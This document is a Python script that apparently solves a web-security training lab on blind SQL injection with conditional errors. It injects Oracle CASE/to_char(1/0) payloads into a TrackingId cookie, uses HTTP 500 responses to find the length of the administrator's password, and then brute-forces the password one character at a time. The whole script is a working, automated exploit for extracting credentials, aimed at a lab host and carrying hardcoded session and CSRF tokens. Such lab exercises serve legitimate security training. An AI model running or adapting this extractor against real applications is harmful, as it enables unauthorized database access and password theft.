#Lab: Blind SQL injection with conditional errors
#Inducing conditional responses by triggering SQL errors

import requests,sys

requests.packages.urllib3.\
disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


payload="+UNION+SELECT+CASE+WHEN+(1=1)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+dual--"

def sql_engine(payload):
	proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

	host="https://aca11f341f1136dc80b7018c0080002e.web-security-academy.net/login"

	#s = request.Session()

	headers={"Cookie": "TrackingId='%s ; session=BVt008KlYrDtAQq9Bs3HeXetpMBq3pO7" %payload}		
	data = {"csrf":"8aCZGKcunI8Xv0AIXdOLKbCnlDmD6IKV","username":"wiener","password":"peter"}

	r = requests.post(host,headers=headers,data=data, proxies=proxies, verify=False)

	return r.status_code

def check_pass_length():

	length=""
	for i in range(1,50):
		payload_pass_length="+UNION+SELECT+CASE+WHEN+(username='administrator'+and+length(password)=%s)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--" %i
		
		req = sql_engine(payload_pass_length)
		#print(req)
		if req == 500:
			
			length = i 
			break
	print ("length of the password is %s" %length)

	return length


def get_pass():
	extracted = ""
	for i in range(1,21):
		#payload_pass="+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+(ascii(substring(password,%s,1)))=[CHAR]--" %i
		payload_pass = "+UNION+SELECT+CASE+WHEN+(username='administrator'+and+ascii(substr(password,%s,1))=[CHAR])+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--"%i
		for j in range(32,126): #loop every possible character in the ASCII printable set
			payload =payload_pass.replace("[CHAR]",str(j))

			req = sql_engine(payload)

			if req == 500:
				extracted += chr(j)
				extracted_char = chr(j)
				sys.stdout.write(extracted_char)
				sys.stdout.flush()
				break

	return extracted


if __name__ == "__main__":

	#sql_engine(payload)
  #check_pass_length()
	get_pass()

